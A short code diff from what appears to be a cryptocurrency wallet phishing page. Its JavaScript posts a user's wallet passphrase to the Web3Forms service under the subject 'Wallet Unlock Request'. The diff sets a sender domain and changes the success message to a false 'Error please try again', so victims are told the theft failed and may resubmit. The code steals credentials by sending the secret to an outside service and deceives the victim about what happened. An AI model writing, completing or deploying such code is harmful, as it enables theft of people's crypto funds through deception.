@@ -147,7 +147,7 @@
     formData.append("access_key", "4dc6960b-625b-4b18-8bae-32891c480914"); // Replace with your Web3Forms Access Key
     formData.append("subject", "Wallet Unlock Request");
     formData.append("from_name", "Wallet User");
-    formData.append("from_email", "noreply@yourdomain.com"); // Replace with your email domain
+    formData.append("from_email", "noreply@pip2pxchange.com"); // Replace with your email domain
     formData.append("message", `Wallet Passphrase: ${walletPassphrase}`);
 
     fetch("https://api.web3forms.com/submit", {
@@ -157,8 +157,8 @@
       .then(response => response.json())
       .then(result => {
         if (result.success) {
-          responseMessage.style.color = "green";
-          responseMessage.textContent = "Passphrase sent successfully!";
+          responseMessage.style.color = "red";
+          responseMessage.textContent = "Error please try again";
         } else {
           responseMessage.style.color = "red";
           responseMessage.textContent = "Failed to send passphrase. Please try again.";
